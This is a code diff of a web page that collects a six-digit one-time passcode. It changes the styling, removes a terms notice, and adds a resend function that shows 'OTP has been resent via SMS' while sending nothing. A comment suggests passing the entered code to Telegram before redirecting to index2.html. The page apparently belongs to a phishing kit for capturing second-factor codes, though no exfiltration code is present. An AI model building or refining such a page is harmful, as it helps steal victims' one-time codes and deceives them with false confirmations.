@@ -61,7 +61,7 @@
         }
 
         .input-box input {
-            width: 100px; /* Width for the OTP input */
+            width: 150px; /* Increased width for the OTP input */
             height: 35px; /* Height for the OTP input */
             font-size: 1rem; /* Adjusted font size */
             text-align: center;
@@ -72,15 +72,9 @@
             padding: 0; /* Remove padding for uniformity */
         }
 
-        .terms {
-            margin-top: 20px;
-            font-size: 0.9rem; /* Adjusted font size */
-            color: #D3D3D3; /* Light gray */
-        }
-
         .error-message {
             margin-top: 10px; /* Space for error message */
-            color: yellow; /* Yellow text for error message */
+            color: yellow; /* Yellow text for messages */
             font-size: 0.9rem; /* Adjusted font size */
             display: none; /* Hidden by default */
         }
@@ -129,13 +123,7 @@
         </div>
     </div>
 
-    <div class="terms">
-        By clicking/tapping "Proceed" you are agreeing to our Terms and Conditions
-    </div>
-
-    <div class="error-message" id="error-message">
-        Invalid OTP
-    </div>
+    <div class="error-message" id="error-message"></div> <!-- Space for error message -->
 
     <div class="buttons">
         <button onclick="validateOTP()">Proceed</button>
@@ -153,12 +141,14 @@
     function validateOTP() {
         const otpInput = document.getElementById('otpInput');
         const otp = otpInput.value;
+        const errorMessage = document.getElementById('error-message');
 
         // Check if the OTP is 6 digits
         if (otp.length !== 6) {
-            document.getElementById('error-message').style.display = 'block'; // Show error message
+            errorMessage.textContent = 'Invalid OTP'; // Show error message
+            errorMessage.style.display = 'block'; // Show error message
         } else {
-            document.getElementById('error-message').style.display = 'none'; // Hide error message
+            errorMessage.style.display = 'none'; // Hide error message
             // Implement success logic here (e.g., redirect, send to Telegram, etc.)
             window.location.href = 'index2.html'; // Redirect to index2.html
         }
@@ -166,8 +156,12 @@
 
     // Function to resend OTP code
     function resendCode() {
-        // Implement the logic to resend the OTP code here
-        alert('OTP Code has been resent!');
+        const errorMessage = document.getElementById('error-message');
+        errorMessage.textContent = 'OTP has been resent via SMS to your mobile number'; // Show confirmation message
+        errorMessage.style.display = 'block'; // Show message
+        setTimeout(() => {
+            errorMessage.style.display = 'none'; // Hide message after 3 seconds
+        }, 3000);
     }
 
     // Prevent non-numeric input for OTP
